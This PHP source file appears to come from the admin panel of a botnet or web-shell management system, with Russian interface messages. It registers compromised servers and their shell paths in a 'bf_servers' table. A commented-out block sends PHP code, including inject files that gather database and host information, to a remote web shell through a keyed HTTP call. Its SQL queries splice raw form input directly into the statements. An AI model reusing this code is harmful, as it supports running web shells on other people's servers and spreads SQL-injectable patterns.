<?php

$smarty->assign('rand_name', mt_rand(0000000000, 9999999999));

if(!empty($Cur['id'])){

    if($client->id == $Cur['id']){
		$smarty->assign("client", $client);
		if(isset($_POST['submit'])){

			if(empty($_POST['ip'])){
				$FORM_BAD = 1;
			}else{
				if($result->ip == $_POST['ip']){
					$FORM_BAD = 1;
				}
			}

			/*
			if(!empty($_POST['link'])){
					$result = $mysqli->query("SELECT domain FROM bf_domains WHERE (domain='".$_POST['link']."')");
					if($result->domain == $_POST['link']){
						$bad_form['ip'] = 'Введенный "Домен админки" уже есть в системе.';
						$FORM_BAD = 1;
					}else{
						if($result->link == $_POST['link']){
							$FORM_BAD = 1;
						}else{
							$get_php .= "print('OK');";
							if(get_http($_POST['link'], $get_php, $_POST['key'], $_POST['shell']) != 'OK'){
								$FORM_BAD = 1;
							}else{
								$get_php .= file_get_contents('modules/admins/injects/mysqli.php');
								$get_php .= file_get_contents('modules/admins/injects/get_info.php');
								$cbots = json_decode(get_http($_POST['link'], $get_php, $_POST['key'], $_POST['shell']), true);
							}
						}
					}
			}
            */

			if($FORM_BAD <> 1){
				if($mysqli->query("INSERT INTO bf_servers (ip, shell, client_id, post_id) VALUES ('".$_POST['ip']."', '".$_POST['shell']."', '".$client->id."', '".$_SESSION['user']->id."')") == false){
					$errors .= '<div class="t"><div class="t4" align="center">Добавления клинента сейчас невозможно, попробуйте позже.</div></div>';
				}else{
					$smarty->assign("registration_end", true);
				}
			}else{
				if(count($bad_form) > 0){
					rsort($bad_form);
					for($i = 0; $i < count($bad_form); $i++){
						if ( $i & 1 ) $value_count = "1"; else $value_count = "2";
						$errors .= '<div class="t"><div class="t4" align="center">' . $bad_form[$i] . '</div></div>';
					}
				}
			}
			$smarty->assign("account_errors", $errors);
		}
	}
}

?>